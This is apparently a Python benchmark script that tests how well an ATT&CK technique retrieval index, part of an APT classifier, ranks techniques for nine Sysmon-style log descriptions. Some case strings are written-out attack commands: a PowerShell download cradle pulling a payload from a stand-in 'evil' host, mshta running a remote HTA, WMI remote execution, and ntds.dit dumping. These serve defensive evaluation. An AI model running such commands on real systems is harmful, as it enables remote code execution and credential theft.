"""OTRF Sysmon retrieval benchmark.

Runs a few representative OTRF-style Sysmon log narratives through the live
ChromaDB technique index and reports the rank of the expected ATT&CK
technique. Measures retrieval quality only, not attribution accuracy.
"""

from __future__ import annotations

import argparse
import json
import sys
from dataclasses import dataclass
from pathlib import Path

from apt_classifier.attack.kb import AttackKnowledgeBase
from apt_classifier.config import Settings
from apt_classifier.embeddings import SentenceTransformerEmbedder
from apt_classifier.evidence.models import EvidenceLedger, Observation, Provenance
from apt_classifier.retrieve import retrieve_techniques
from apt_classifier.vectorstore import ChromaVectorStore

REPO_ROOT = Path(__file__).resolve().parent.parent
KB_PATH = REPO_ROOT / "data" / "kb" / "attack_kb.json"


@dataclass(frozen=True)
class OtrfCase:
    label: str
    text: str
    expected_technique_id: str


CASES = (
    OtrfCase(
        "PowerShell encoded listener",
        "powershell.exe -nop -w hidden -enc <base64> started a TCP listener on port 4444.",
        "T1059.001",
    ),
    OtrfCase(
        "LSASS Dumpert",
        "lsass.exe memory was dumped by an unsigned binary using direct syscalls (NtCreateSection + NtMapViewOfSection).",
        "T1003.001",
    ),
    OtrfCase(
        "MSHTA execution",
        "mshta.exe executed a remote HTA payload from http://example/payload.hta.",
        "T1218.005",
    ),
    OtrfCase(
        "Windows logon script",
        "A logon script was placed in the Startup folder for persistence across user logons.",
        "T1037.001",
    ),
    OtrfCase(
        "Remote-thread injection",
        "CreateRemoteThread was used to inject a DLL into explorer.exe from a foreign process.",
        "T1055",
    ),
    OtrfCase(
        "WMI lateral movement",
        "wmic.exe /node:10.0.0.5 process call create cmd.exe was used for remote execution.",
        "T1047",
    ),
    OtrfCase(
        "Registry Run key",
        "A value was written to HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run for persistence.",
        "T1547.001",
    ),
    OtrfCase(
        "Credential dumping via ntds.dit",
        "ntdsutil.exe activated instance ntds and created a snapshot to dump ntds.dit.",
        "T1003.003",
    ),
    OtrfCase(
        "PowerShell downloaded cradle",
        "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil/payload.ps1')",
        "T1059.001",
    ),
)


def run(threshold: float) -> dict:
    settings = Settings()
    embedder = SentenceTransformerEmbedder.from_settings(settings)
    store = ChromaVectorStore(settings=settings, embedder=embedder)
    kb = AttackKnowledgeBase.load(KB_PATH)
    details = []
    for case in CASES:
        ledger = EvidenceLedger(
            observations=[Observation(text=case.text, provenance=Provenance(source="free_text"))]
        )
        result = retrieve_techniques(ledger, store, kb, threshold=threshold)
        ranked = sorted(result.matches, key=lambda match: -match.score)
        seen: list[str] = []
        for match in ranked:
            if match.technique_id not in seen:
                seen.append(match.technique_id)
        rank = (
            seen.index(case.expected_technique_id) + 1
            if case.expected_technique_id in seen
            else None
        )
        details.append(
            {
                "label": case.label,
                "expected": case.expected_technique_id,
                "rank": rank,
                "retrieved_top10": seen[:10],
            }
        )
    return {"cases": len(CASES), "details": details}


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--threshold", type=float, default=0.45)
    parser.add_argument("--json", action="store_true")
    args = parser.parse_args()
    report = run(args.threshold)
    if args.json:
        print(json.dumps(report, indent=2, sort_keys=True))
    else:
        print(f"OTRF Sysmon retrieval benchmark ({report['cases']} cases)")
        for item in report["details"]:
            print(
                f"  - {item['label']}: expected={item['expected']} rank={item['rank']} "
                f"top10={item['retrieved_top10']}"
            )
    return 0


if __name__ == "__main__":
    sys.exit(main())
